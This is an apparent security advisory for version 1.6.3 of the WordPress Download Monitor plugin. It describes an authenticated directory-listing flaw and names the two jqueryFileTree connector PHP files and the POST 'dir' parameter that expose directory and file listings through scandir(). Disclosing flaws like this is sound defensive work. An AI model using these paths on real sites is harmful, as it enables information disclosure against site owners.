WordPress download-monitor 1.6.3 Authenicated Directory Listing


[-] Plugin Link:

https://wordpress.org/plugins/download-monitor/
https://www.download-monitor.com/

[-] Affected Version:

Version 1.6.3


[-] Vulnerability Description:

a directory listing vulnerability can lead to information disclosure(phpinfo, backups, etc...)
the only requirement needed to run this is an authenicated user and there is a lot of sites enabling user registration
accessing /download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTreeDir.php directly with $_POST['dir'] set to a directory path will show you all directories inside the selected path
and there is also /download-monitor/assets/js/jqueryFileTree/connectors/jqueryFileTree.php , it will show you all directories and files inside the requested dir
this is because scandir() is being used
